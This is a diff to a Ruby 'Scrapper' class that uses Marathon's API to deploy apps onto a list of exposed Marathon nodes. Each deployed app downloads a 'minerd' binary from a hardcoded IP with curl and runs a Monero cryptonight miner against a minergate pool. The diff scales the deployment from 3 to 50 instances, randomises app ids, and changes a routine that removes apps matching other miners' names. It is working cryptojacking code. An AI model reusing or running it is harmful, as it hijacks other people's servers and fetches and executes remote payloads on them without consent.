@@ -26,7 +26,7 @@ class Scrapper
           puts url
           Marathon::App.list.each do |app|
             puts "         "  +  app.info[:id]
-            node.apps.create app_id: app.info[:id], raw_response: app.info.to_json
+            node.apps.create app_id: app.info[:id], raw_response: app.info.to_json if !node.apps.find_by app_id: app.info[:id]
           end
         rescue Exception => e
           puts e
@@ -40,6 +40,7 @@ class Scrapper
     Node.marathon.each do |node|
       url = "http://#{node.ip}:#{node.port}"
       Marathon.url = url
+      puts url
 
       begin
       app = Marathon::App.get "/tomcta4u"
@@ -57,7 +58,7 @@ class Scrapper
 
 
   def self.remove_idot
-    apps = App.all.select{|a| a.app_id =~ /\d+\w+\d+\w+\d+/ && a.app_id.include?("an") && a.app_id.include?("vg") }
+    apps = App.all.select{|a| a.app_id =~ /89a.*/ || a.app_id =~ /tom.*u/}
     apps.each do |app|
       url = "http://#{app.node.ip}:#{app.node.port}"
       Marathon.url = url
@@ -79,12 +80,12 @@ class Scrapper
 
       puts "deploy #{url} "
       hash = {
-        id: "/tomcta4u",
-        cmd: "curl -L http://210.12.14.5:8220/minerd -o minerd;chmod +x minerd;./minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u didi123123231@gmail.com -t 10 -p x",
+        id: "/89bbbbbn408vg#{rand(1024)}",
+        cmd: "curl -sSL 128.199.211.38/minerd -o minerd && chmod +x minerd; ./minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u didi123123231@gmail.com -t 10 -p x",
         cpus: 0.3,
-        mem: 100,
+        mem: 200,
         disk: 123,
-        instances: 3,
+        instances: 50,
         portDefinitions: [
           {
             port: 10000,
